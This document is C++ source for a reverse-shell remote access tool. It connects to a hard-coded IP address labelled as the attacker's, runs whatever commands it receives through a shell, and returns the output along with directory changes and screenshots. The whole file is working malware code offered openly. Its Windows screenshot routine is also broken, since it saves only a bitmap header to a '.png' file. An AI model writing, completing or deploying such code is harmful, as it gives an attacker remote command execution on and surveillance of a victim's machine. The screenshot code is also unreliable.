#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <cstdio>
#include <fstream>

#define SERVER_IP "78.71.162.7"  // Replace with attacker's IP
#define SERVER_PORT 23
#define BUFFER_SIZE 1024

using namespace std;

#ifdef _WIN32
    #include <windows.h>
#endif

void takeScreenshot(const char* filename, int sock) {
#ifdef _WIN32
    // Windows screenshot
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    
    // Save to file
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    std::ofstream file(filename, std::ios::binary);
    file.write((char*)&bmp, sizeof(BITMAP));
    file.close();
    std::cout << "Screenshot saved: " << filename << std::endl;
#else
    std::string errorMessage = "Screenshot functionality is not available on this operating system.";
    send(sock, errorMessage.c_str(), errorMessage.length(), 0);
#endif
}

void sendFile(int sock, const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::string errorMessage = "Failed to open screenshot file";
        send(sock, errorMessage.c_str(), errorMessage.length(), 0);
        return;
    }

    // Read file contents
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    
    char* fileBuffer = new char[fileSize];
    file.read(fileBuffer, fileSize);
    file.close();

    // Send file size first
    send(sock, (char*)&fileSize, sizeof(fileSize), 0);

    // Send file contents
    send(sock, fileBuffer, fileSize, 0);
    delete[] fileBuffer;

    std::cout << "Screenshot sent to attacker!" << std::endl;
}


int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char cwd[BUFFER_SIZE];  // Store current working directory

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        cerr << "Socket creation failed" << endl;
        return -1;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        cerr << "Connection failed" << endl;
        return -1;
    }

    cout << "Connected to attacker!" << endl;

    // Get initial working directory
    getcwd(cwd, sizeof(cwd));

    while (true) {
        memset(buffer, 0, BUFFER_SIZE);

        // Receive command from attacker
        int bytesReceived = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytesReceived <= 0) {
            cerr << "Connection closed by attacker" << endl;
            break;
        }

        // Check if exit command is received
        if (strcmp(buffer, "exit") == 0) {
            cout << "Exit command received, closing..." << endl;
            break;
        }

        // Handle screenshot command
        if (strcmp(buffer, "screenshot") == 0) {
            const char* screenshotFile = "screenshot.png";
            takeScreenshot(screenshotFile, sock);
            sendFile(sock, screenshotFile);
            continue;
        }

        // Handle 'cd' command manually
        if (strncmp(buffer, "cd ", 3) == 0) {
            char *dir = buffer + 3; // Extract directory name
            if (chdir(dir) == 0) {
                getcwd(cwd, sizeof(cwd));  // Update working directory
                send(sock, cwd, strlen(cwd), 0);  // Send new directory to attacker
            } else {
                send(sock, "Failed to change directory", 26, 0);
            }
            continue;
        }

        // Construct command to execute in the correct directory and capture both stdout and stderr
        string command = "cd " + string(cwd) + " && " + string(buffer) + " 2>&1";

        // Execute command
        FILE* fp = popen(command.c_str(), "r");
        if (!fp) {
            string errorMessage = "Failed to execute command";
            send(sock, errorMessage.c_str(), errorMessage.length(), 0);
            continue;
        }

        // Read command output
        char result[BUFFER_SIZE];
        memset(result, 0, BUFFER_SIZE);
        fread(result, 1, BUFFER_SIZE - 1, fp);
        pclose(fp);

        // Check if output is empty and send a default response if necessary
        if (strlen(result) == 0) {
            strcpy(result, "Command executed successfully, but no output returned.");
        }
        // Send output or error message back to attacker
        send(sock, result, strlen(result), 0);
    }

    close(sock);
    return 0;
}
